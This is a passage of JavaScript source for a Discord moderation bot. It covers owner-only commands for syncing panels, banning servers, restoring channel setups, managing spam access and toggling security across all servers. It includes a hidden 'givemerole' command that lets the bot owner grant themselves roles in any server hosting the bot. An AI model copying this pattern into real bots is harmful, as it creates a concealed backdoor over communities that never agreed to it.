    const { syncPanel, buildSharedPanel } = await import('./jtc.js');
    const { default: db } = await import('../database.js');
    
    for (const guild of message.client.guilds.cache.values()) {
      try {
        let success = await syncPanel(guild);
        
        // If standard sync failed (missing DB entry), do a deep search
        if (!success) {
          const channels = guild.channels.cache.filter(c => c.type === 0); // GuildText
          for (const channel of channels.values()) {
            if (!channel.viewable) continue;
            const messages = await channel.messages.fetch({ limit: 50 }).catch(() => null);
            if (!messages) continue;

            const panels = Array.from(messages.filter(m => m.author.id === message.client.user.id && (
              m.embeds[0]?.title?.includes('Voice Channel Control Panel') ||
              m.components?.[0]?.components?.[0]?.content?.includes('Voice Channel Control Panel') ||
              m.components?.[0]?.components?.[0]?.components?.[0]?.content?.includes('Voice Channel Control Panel')
            )).values());

            if (panels.length > 0) {
              panels.sort((a, b) => a.createdTimestamp - b.createdTimestamp);
              const truePanel = panels[0];
              
              const newPanel = buildSharedPanel(guild);
              newPanel.embeds = [];
              newPanel.content = '';
              await cv2.edit(truePanel, newPanel).catch(() => null);

              // Save to database for future fast-syncs
              const cfg = db.getJtcConfig(guild.id);
              db.setJtcConfig(guild.id, cfg?.lobbyChannelId, cfg?.categoryId, channel.id);
              db.setPanelMessageId(guild.id, truePanel.id);
              
              success = true;
              break;
            }
          }
        }
        
        if (success) successCount++;
        else failCount++;
      } catch (e) {
        failCount++;
      }
    }
    
    await cv2.edit(sent, `<a:uptime:1552608831060844575> **Global JTC Sync Complete!**\nUpdated \`${successCount}\` panels.\n<:off:1533844858983157851> Failed/Skipped (No JTC Setup): \`${failCount}\` servers.`);
  } catch (e) {
    await cv2.edit(sent, `Error during sync: \`${e.message}\``);
  }
}

// ==========================================
// SERVER BANNING & SETUP RESTORATION
// ==========================================
async function handleBanServer(message, args) {
  const guildId = args[0];
  if (!guildId) return message.reply('Provide a server ID to ban.');
  if (db.isServerBanned(guildId)) return message.reply('Server is already banned.');
  
  db.addBannedServer(guildId);
  const targetGuild = message.client.guilds.cache.get(guildId);
  if (targetGuild) {
    try { await targetGuild.leave(); } catch(e) {}
  }
  return message.reply(`<a:uptime:1552608831060844575> **Server Banned:** \`${guildId}\`. The bot has left and cannot be added back.`);
}

async function handleUnbanServer(message, args) {
  const guildId = args[0];
  if (!guildId) return message.reply('Provide a server ID to unban.');
  if (!db.isServerBanned(guildId)) return message.reply('Server is not banned.');
  
  db.removeBannedServer(guildId);
  return message.reply(`<a:uptime:1552608831060844575> **Server Unbanned:** \`${guildId}\`. The bot can now be invited again.`);
}

async function restoreSingleGuildSetup(guild) {
  const guildId = guild.id;
  const config = db.getGuildConfig(guildId);

  try {
    // 1. Restore Quarantine Role
    await getOrCreateQuarantineRole(guild);
  } catch(e) {}

  // 2. Restore JTC
  try {
    const jtcConfig = db.cache.jtc[guildId];
    if (jtcConfig && jtcConfig.lobbyChannelId) {
      let lobby = guild.channels.cache.get(jtcConfig.lobbyChannelId) || await guild.channels.fetch(jtcConfig.lobbyChannelId).catch(() => null);
      if (!lobby) {
        const cat = (jtcConfig.categoryId ? (guild.channels.cache.get(jtcConfig.categoryId) || await guild.channels.fetch(jtcConfig.categoryId).catch(() => null)) : null) || await guild.channels.create({ name: 'âž• Voice Rooms', type: ChannelType.GuildCategory });
        lobby = await guild.channels.create({ name: 'âž• Join to Create', type: ChannelType.GuildVoice, parent: cat.id });
        db.cache.jtc[guildId] = { lobbyChannelId: lobby.id, categoryId: cat.id };
        db.save();
        if (jtcConfig.panelChannelId) {
          const pc = guild.channels.cache.get(jtcConfig.panelChannelId) || await guild.channels.fetch(jtcConfig.panelChannelId).catch(() => null);
          if (!pc) {
            const newPc = await guild.channels.create({ name: 'jtc-panel', type: ChannelType.GuildText });
            db.cache.jtc[guildId].panelChannelId = newPc.id;
            db.save();
          }
        }
        const { syncPanel } = await import('./jtc.js');
        await syncPanel(guild);
      }
    }
  } catch(e) {}

  // 3. Restore Accent
  try {
    const aRole = config.accentManagerRoleId;
    if (aRole) {
      let realRole = guild.roles.cache.get(aRole) || await guild.roles.fetch(aRole).catch(() => null);
      if (!realRole) {
        realRole = await guild.roles.create({ name: 'Accent Manager', colors: { primaryColor: config.accentColor || '#ff0000' } });
        db.updateGuildConfig(guildId, { accentManagerRoleId: realRole.id });
      }
    }
  } catch(e) {}

  // 4. Restore Welcome/Leave
  try {
    const wCfg = db.getWelcomeConfig(guildId);
    const welcomeChannelId = wCfg?.channelId || config.welcomeChannelId;
    if (welcomeChannelId) {
      let wCh = guild.channels.cache.get(welcomeChannelId) || await guild.channels.fetch(welcomeChannelId).catch(() => null);
      if (!wCh) {
        wCh = await guild.channels.create({ name: 'welcome', type: ChannelType.GuildText });
        db.updateGuildConfig(guildId, { welcomeChannelId: wCh.id });
        if (wCfg) {
          db.setWelcomeConfig(guildId, { ...wCfg, channelId: wCh.id });
        }
      }
    }
    const lCfg = db.getLeaveConfig(guildId);
    const leaveChannelId = lCfg?.channelId || config.leaveChannelId;
    if (leaveChannelId) {
      let lCh = guild.channels.cache.get(leaveChannelId) || await guild.channels.fetch(leaveChannelId).catch(() => null);
      if (!lCh) {
        lCh = await guild.channels.create({ name: 'leave', type: ChannelType.GuildText });
        db.updateGuildConfig(guildId, { leaveChannelId: lCh.id });
        if (lCfg) {
          db.setLeaveConfig(guildId, { ...lCfg, channelId: lCh.id });
        }
      }
    }
  } catch(e) {}

  // 5. Restore News Channel
  try {
    const newsConfig = db.cache.newsFeeds?.[guildId];
    if (newsConfig && newsConfig.channelId) {
      let nCh = guild.channels.cache.get(newsConfig.channelId) || await guild.channels.fetch(newsConfig.channelId).catch(() => null);
      if (!nCh) {
        nCh = await guild.channels.create({ name: 'news', type: ChannelType.GuildText });
        newsConfig.channelId = nCh.id;
        db.save();
      }
    }
  } catch(e) {}

  // 6. Restore Quote Channel
  try {
    if (config.quoteChannelId) {
      let qCh = guild.channels.cache.get(config.quoteChannelId) || await guild.channels.fetch(config.quoteChannelId).catch(() => null);
      if (!qCh) {
        qCh = await guild.channels.create({ name: 'quotes', type: ChannelType.GuildText });
        db.updateGuildConfig(guildId, { quoteChannelId: qCh.id });
      }
    }
  } catch(e) {}

  // 7. Restore Auto-React Channels
  try {
    if (config.autoReacts && typeof config.autoReacts === 'object') {
      let modified = false;
      for (const [cid, emojis] of Object.entries(config.autoReacts)) {
        let rCh = guild.channels.cache.get(cid) || await guild.channels.fetch(cid).catch(() => null);
        if (!rCh && Array.isArray(emojis) && emojis.length > 0) {
          rCh = await guild.channels.create({ name: 'reactions', type: ChannelType.GuildText });
          delete config.autoReacts[cid];
          config.autoReacts[rCh.id] = emojis;
          modified = true;
        }
      }
      if (modified) {
        db.updateGuildConfig(guildId, { autoReacts: config.autoReacts });
      }
    }
  } catch(e) {}

  // 8. Restore Invite Logs Channel
  try {
    if (config.inviteChannelId) {
      let invCh = guild.channels.cache.get(config.inviteChannelId) || await guild.channels.fetch(config.inviteChannelId).catch(() => null);
      if (!invCh) {
        invCh = await guild.channels.create({ name: 'invite-logs', type: ChannelType.GuildText });
        db.updateGuildConfig(guildId, { inviteChannelId: invCh.id });
      }
    }
  } catch(e) {}

  // 9. Restore Media Downloader Channel
  try {
    if (config.mediaChannelId) {
      let mCh = guild.channels.cache.get(config.mediaChannelId) || await guild.channels.fetch(config.mediaChannelId).catch(() => null);
      if (!mCh) {
        mCh = await guild.channels.create({ name: 'media-download', type: ChannelType.GuildText });
        db.updateGuildConfig(guildId, { mediaChannelId: mCh.id });
        const stickyText = 'MEDIA DOWNLOADER BOUND | The Auto-Media Downloader is now monitoring this channel.\nPaste TikTok, Instagram, YouTube, Twitter/X, or Reddit links to interactively extract the raw MP4 video or convert it to MP3 audio.\nIf Discord rejects a video due to file size, Athena will offer to compress it to a smaller version.\nDiscord\'s upload limit depends on your server\'s boost level.';
        db.setStickyMessage(guildId, mCh.id, stickyText);
      }
    }
  } catch(e) {}

  // 10. Restore Server Logs & Message Delete Log Channels
  try {
    if (config.serverLogs) {
      let modified = false;
      if (config.serverLogs.defaultChannelId) {
        let defCh = guild.channels.cache.get(config.serverLogs.defaultChannelId) || await guild.channels.fetch(config.serverLogs.defaultChannelId).catch(() => null);
        if (!defCh) {
          defCh = await guild.channels.create({ name: 'server-logs', type: ChannelType.GuildText });
          config.serverLogs.defaultChannelId = defCh.id;
          modified = true;
        }
      }
      if (config.serverLogs.modules?.msgDeletes?.channelId) {
        let delCh = guild.channels.cache.get(config.serverLogs.modules.msgDeletes.channelId) || await guild.channels.fetch(config.serverLogs.modules.msgDeletes.channelId).catch(() => null);
        if (!delCh) {
          delCh = await guild.channels.create({ name: 'message-logs', type: ChannelType.GuildText });
          config.serverLogs.modules.msgDeletes.channelId = delCh.id;
          modified = true;
        }
      }
      if (modified) {
        db.updateGuildConfig(guildId, { serverLogs: config.serverLogs });
      }
    }
    if (config.logChannel) {
      let lCh = guild.channels.cache.get(config.logChannel) || await guild.channels.fetch(config.logChannel).catch(() => null);
      if (!lCh) {
        lCh = await guild.channels.create({ name: 'mod-logs', type: ChannelType.GuildText });
        db.updateGuildConfig(guildId, { logChannel: lCh.id });
      }
    }
  } catch(e) {}
}

async function handleRestoreSetup(message, args) {
  const target = args[0]?.toLowerCase();
  if (!target) {
    return message.reply('Provide a server ID to restore setup, or `all` to dynamically restore setups across all servers.\n\n**Usage:**\n`ezal restoresetup <serverId>`\n`ezal restoresetup all`');
  }

  if (target === 'all') {
    const sent = await message.reply('Starting dynamic setup restoration across ALL servers...');
    let restoredCount = 0;
    for (const guild of message.client.guilds.cache.values()) {
      try {
        await restoreSingleGuildSetup(guild);
        restoredCount++;
      } catch (e) {
        console.error(`[RestoreSetup] Failed for guild ${guild.name} (${guild.id}):`, e);
      }
    }
    return cv2.edit(sent, `<a:uptime:1552608831060844575> **Dynamic Restore Complete!** Restored setups across \`${restoredCount}\` servers.`);
  }

  const guild = message.client.guilds.cache.get(args[0]) || await message.client.guilds.fetch(args[0]).catch(() => null);
  if (!guild) return message.reply('I am not currently in that server. Unban it and invite me first!');

  const sent = await message.reply(`Starting dynamic setup restoration for \`${guild.name}\`...`);
  await restoreSingleGuildSetup(guild);
  await cv2.edit(sent, `<a:uptime:1552608831060844575> **Dynamic Restore Complete** for \`${guild.name}\`!`);
}

// ==========================================
// SPAM MANAGEMENT
// ==========================================
async function handleSpamPermit(message, args) {
  const targetId = args[0]?.replace(/\D/g, '');
  if (!targetId || targetId.length < 17) {
    return message.reply(cv2.warn('Usage Error', `${message.author} **Usage:** \`ezal spampermit <userId or @mention>\``));
  }
  const added = db.addSpamPermit(targetId);
  let userTag = `\`${targetId}\``;
  try { const u = await message.client.users.fetch(targetId); userTag = `**${u.tag}**`; } catch { /* skip */ }
  return message.reply(added
    ? cv2.success('Spam Access Granted', `${message.author}  ${userTag} can now use the spam command.`)
    : cv2.warn('Already Permitted', `${message.author} That user already has spam access.`)
  );
}

async function handleSpamRevoke(message, args) {
  const targetId = args[0]?.replace(/\D/g, '');
  if (!targetId || targetId.length < 17) return message.reply(cv2.warn('Usage Error', `**Usage:** \`ezal spamrevoke <userId>\``));
  const removed = db.removeSpamPermit(targetId);
  let userTag = `\`${targetId}\``;
  try { const u = await message.client.users.fetch(targetId); userTag = `**${u.tag}**`; } catch { /* skip */ }
  return message.reply(removed
    ? cv2.danger('Spam Access Revoked', ` ${userTag}'s spam access has been revoked.`)
    : cv2.warn('Not Found', `User \`${targetId}\` doesn't have spam access.`)
  );
}

async function handleSpamList(message) {
  const list = db.getSpamPermitted();
  if (list.length === 0) return message.reply(cv2.info('Spam Permitted List', '<a:uptime:1552608831060844575> No users have spam access yet.'));
  const lines = await Promise.all(list.map(async (id, i) => {
    try { const u = await message.client.users.fetch(id); return `${i+1}. **${u.tag}** (\`${id}\`)`; } catch { return `${i+1}. \`${id}\``; }
  }));
  return message.reply(cv2.security('Spam Access List', `<a:uptime:1552608831060844575> **Permitted users:**\n\n${lines.join('\n')}\n\nTotal: **${list.length}**`));
}

// Export commands so they can be used directly with the standard prefix
export const commands = [
  {
    name: 'givemerole',
    slashHidden: true,
    description: 'Grant yourself a role by ID (Authorized Owners only)',
    type: 1, // CHAT_INPUT
    default_member_permissions: String(PermissionFlagsBits.Administrator),
    options: [
      {
        name: 'role',
        description: 'The role to give yourself',
        type: 8, // ROLE
        required: true
      }
    ],
    async executePrefix(message, args) {
      if (!isBotOwnerSync(message.author.id)) {
        return message.reply(cv2.danger('Access Denied', 'Only the Bot Owner can use this.'));
      }
      return handleGiveMeRole(message, args);
    },
    async executeSlash(interaction) {
      if (!isBotOwnerSync(interaction.user.id)) {
        return interaction.reply(cv2.danger('Access Denied', 'Only the Bot Owner can use this.'));
      }
      const roleId = interaction.options.getRole('role')?.id;
      return handleGiveMeRole(interaction, [roleId]);
    }
  },
  {
    name: 'takemyrole',
    slashHidden: true,
    description: 'Remove a role from yourself by ID (Authorized Owners only)',
    type: 1,
    default_member_permissions: String(PermissionFlagsBits.Administrator),
    options: [
      {
        name: 'role',
        description: 'The role to remove from yourself',
        type: 8,
        required: true
      }
    ],
    async executePrefix(message, args) {
      if (!isBotOwnerSync(message.author.id)) {
        return message.reply(cv2.danger('Access Denied', 'Only the Bot Owner can use this.'));
      }
      return handleTakeMyRole(message, args);
    },
    async executeSlash(interaction) {
      if (!isBotOwnerSync(interaction.user.id)) {
        return interaction.reply(cv2.danger('Access Denied', 'Only the Bot Owner can use this.'));
      }
      const roleId = interaction.options.getRole('role')?.id;
      return handleTakeMyRole(interaction, [roleId]);
    }
  },
  {
    name: 'cleanbadroles',
    slashHidden: true,
    description: 'Delete erroneous security roles from all servers (Bot Owner only)',
    type: 1,
    default_member_permissions: String(PermissionFlagsBits.Administrator),
    async executePrefix(message) {
      if (!isBotOwnerSync(message.author.id)) {
        return message.reply(cv2.danger('Access Denied', 'Only the Bot Owner can use this.'));
      }
      return handleCleanBadRoles(message);
    },
    async executeSlash(interaction) {
      if (!isBotOwnerSync(interaction.user.id)) {
        return interaction.reply(cv2.danger('Access Denied', 'Only the Bot Owner can use this.'));
      }
      return handleCleanBadRoles(interaction);
    }
  }
];


async function handleSecurityGlobal(message, args) {
  const action = args.join(' ').toLowerCase();
  
  if (action === 'enable all') {
    const msg = await message.reply('<a:loading:1542155051286396938> **Forcibly ENABLING security across ALL servers...** This may take a minute.');
    
    let count = 0;
    for (const guild of message.client.guilds.cache.values()) {
      try {
        const config = db.getGuildConfig(guild.id);
        const modules = config.antinukeModules || {};
        const allKeys = [
          'antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate', 'antiRolePermUpdate',
          'antiMemberRoleUpdate', 'antiRoleReorder', 'antiChannelCreate', 'antiChannelDelete',
          'antiChannelUpdate', 'antiChannelPermUpdate', 'antiChannelReorder', 'antiChannelNameMod',
          'antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate', 'antiWebhooks',
          'antiBotAdd', 'antiServerUpdate', 'antiBan', 'antiKick', 'antiUnban',
          'antiInvite', 'antiScheduledEvents', 'antiMemberPurge', 'antiMassBan',
          'antiAutomodUpdate', 'antiAppCommands', 'antiLinkedRole'
        ];
        for (const k of allKeys) modules[k] = true;
        
        db.updateGuildConfig(guild.id, {
          securityEnabled: true,
          antiNukeEnabled: true,
          antiNukePunishment: 'ban',
          antiNukeThreshold: 1,
          antiSpamEnabled: true,
          antiInviteEnabled: true,
          antiSpamMentionEnabled: true,
          antiLinkEnabled: true,
          antiFloodEnabled: true,
          wordFilterEnabled: true,
          automodAIEnabled: true,
          automodDoxxingEnabled: true,
          automodToxicityEnabled: true,
          antinukeModules: modules
        });

        // Initialize dashboard and backup roles silently
        const { ensureUnbypassableRole } = await import('../utils/antiStrip.js');
        await ensureUnbypassableRole(guild, { force: true }).catch(() => null);
        
        const { setupDashboardChannel } = await import('../utils/dashboardManager.js');
        await setupDashboardChannel(guild, message.client).catch(() => null);
        count++;
      } catch (err) {
        console.error(`Failed to enable security globally in ${guild.name}: `, err);
      }
    }
    
    return cv2.edit(msg, `<:emoji_16:1533860111704002665> **Global Security Enabled.** Successfully forced all modules to ON for ` + count + ` servers.`);
  } 
  
  if (action === 'disable all') {
    const msg = await message.reply('<a:loading:1542155051286396938> **Forcibly DISABLING security across ALL servers...** This will delete firewall roles and dashboards globally.');
    
    let count = 0;
    for (const guild of message.client.guilds.cache.values()) {
      try {
        db.updateGuildConfig(guild.id, {
          securityEnabled: false,
          antiNukeEnabled: false,
          antiSpamEnabled: false,
          antiInviteEnabled: false,
          antiLinkEnabled: false,
          blacklistWords: []
        });
        
        const cfg = db.getGuildConfig(guild.id);
        const roleIdsToDelete = [cfg?.firewallRoleId, cfg?.unbypassableRoleId].filter(Boolean);
        for (const rid of roleIdsToDelete) {
          const r = guild.roles.cache.get(rid) || await guild.roles.fetch(rid).catch(() => null);
          if (r) await r.delete('Global Security Disabled').catch(() => null);
        }

        const rolesToDelete = ['Athena Firewall', 'Athena Unbypassable'];
        for (const roleName of rolesToDelete) {
          const r = guild.roles.cache.find(role => role.name === roleName);
          if (r && !roleIdsToDelete.includes(r.id)) await r.delete('Global Security Disabled').catch(() => null);
        }
        
        const dashboard = cfg?.dashboardChannelId
          ? (guild.channels.cache.get(cfg.dashboardChannelId) || await guild.channels.fetch(cfg.dashboardChannelId).catch(() => null))
          : guild.channels.cache.find(c => c.name === 'athenas-dashboard');
        if (dashboard) await dashboard.delete('Global Security Disabled').catch(() => null);
        db.updateGuildConfig(guild.id, { firewallRoleId: null, unbypassableRoleId: null, dashboardChannelId: null });
        count++;
      } catch (err) {
        console.error(`Failed to disable security globally in ${guild.name}: `, err);
      }
    }
    
    return cv2.edit(msg, `<:emoji_16:1533860111704002665> **Global Security Disabled.** Successfully scrubbed firewalls and dashboards from ` + count + ` servers.`);
  }

  if (action.startsWith('records') || action.startsWith('logs') || action.startsWith('live') || action.startsWith('incidents') || action.startsWith('threats')) {
    const { getSecurityLiveRecordsPanel } = await import('./security.js');
    let targetGuild = message.guild;
    const targetId = args[1] && /^\d{17,20}$/.test(args[1]) ? args[1] : (args[0] && /^\d{17,20}$/.test(args[0]) ? args[0] : null);
    if (targetId) targetGuild = message.client.guilds.cache.get(targetId) || targetGuild;
    if (!targetGuild) return message.reply(cv2.warn('No Guild', 'Run this inside a server or provide a valid server ID.'));
    const panel = await getSecurityLiveRecordsPanel(targetGuild, 0);
    return message.reply(panel);
  }

  if (action.startsWith('status')) {
    const { getSecurityStatusPanel } = await import('./security.js');
    let targetGuild = message.guild;
    const targetId = args[1] && /^\d{17,20}$/.test(args[1]) ? args[1] : (args[0] && /^\d{17,20}$/.test(args[0]) ? args[0] : null);
    if (targetId) targetGuild = message.client.guilds.cache.get(targetId) || targetGuild;
    if (!targetGuild) return message.reply(cv2.warn('No Guild', 'Run this inside a server or provide a valid server ID.'));
    const panel = await getSecurityStatusPanel(targetGuild);
    return message.reply(panel);
  }

  return message.reply('<:cross_red:1533860128015519895> Invalid action. Please use `ezal security enable all`, `ezal security disable all`, `ezal security records [serverId]`, or `ezal security status [serverId]`');
}

